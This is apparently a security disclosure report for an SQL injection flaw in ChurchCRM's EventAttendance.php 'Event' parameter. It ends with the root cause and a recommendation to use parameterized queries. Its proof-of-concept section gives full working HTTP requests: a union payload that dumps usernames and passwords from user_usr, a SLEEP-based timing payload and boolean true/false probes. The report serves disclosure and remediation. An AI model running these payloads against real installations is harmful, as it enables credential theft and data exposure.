# Description
The endpoint **/EventAttendance.php** is vulnerable to Union-based and Blind SQL Injection (Boolean & Time-based) via the **Event** GET parameter. 

This endpoint can be triggered through the following menu: Events - Event Attendance Reports - Church Service/Sunday School. The Event Parameter is taken directly from the query string and passed into the SQL query without any sanitization or input escaping. This allows the attacker to inject malicious Event payloads to execute the malicious SQL query.


# Proof of Concept

1. Retrieving the username & password from user_usr table through **Union-based SQL Injection**.

**Affected Parameter**: Event

**Payload**: SELECT 1,NULL,CONCAT(usr_Username,':',usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from user_usr-- -


```
GET /churchcrm/EventAttendance.php?Action=List&Event=2+UNION+ALL+SELECT+1,NULL,CONCAT(usr_Username,':',usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user_usr--+-&Type=Sunday%20School HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:8888/churchcrm/EventAttendance.php
Cookie: CRM-2c90cf299230a50dab55aee824ed9b08=epssb3ek27omiaeu1ovnjuuaka
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

```

![image](https://drive.google.com/uc?export=view&id=1IzY7UChBtUnl-4UBcO343TUvKhCh7UC3)



2. Triggering response delays with MySQL sleep function through **Time-based SQL Injection**.

**Affected Parameter**: Event

**Payload**: 2 OR SLEEP(5)-- -

```
GET /churchcrm/EventAttendance.php?Action=List&Event=2+OR+SLEEP(5)--+-&Type=Sunday%20School HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:8888/churchcrm/EventAttendance.php
Cookie: CRM-2c90cf299230a50dab55aee824ed9b08=epssb3ek27omiaeu1ovnjuuaka
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

```

![image](https://drive.google.com/uc?export=view&id=1_fug3-M-XnEu7mD2eAc9qCVMOPUKxg2N)


3. Conditional Response with TRUE and FALSE conditions through **Boolean-based SQL Injection**.

**Affected Parameter**: Event

**TRUE Payload**: 99 OR 1=1-- -

**FALSE Payload**: 99 OR 1=2-- -

True Payload will show all events regardless the wrong event id submitted
```
GET /churchcrm/EventAttendance.php?Action=List&Event=99+OR+1%3d1--+-&Type=Sunday%20School HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:8888/churchcrm/EventAttendance.php
Cookie: CRM-2c90cf299230a50dab55aee824ed9b08=epssb3ek27omiaeu1ovnjuuaka
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

```

![image](https://drive.google.com/uc?export=view&id=1EIaib9DQwM4kfNLDmKLUVegXxhiPjcXB)


False Payload will not show any events

```
GET /churchcrm/EventAttendance.php?Action=List&Event=99+OR+1%3d2--+-&Type=Sunday%20School HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:8888/churchcrm/EventAttendance.php
Cookie: CRM-2c90cf299230a50dab55aee824ed9b08=epssb3ek27omiaeu1ovnjuuaka
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

```

![image](https://drive.google.com/uc?export=view&id=1sdP1a2NaemtDxIy2Zntw2ziSJ-CezSn3)

# Root Cause
User input on the Event parameter is not sanitized and used directly in the query through string concatenation.
https://github.com/ChurchCRM/CRM/blob/master/src/EventAttendance.php#L53

# Recommendation
Avoid direct string concatenation into the sql query. It's recommended to use input sanitization as well as implementing parameterized query.
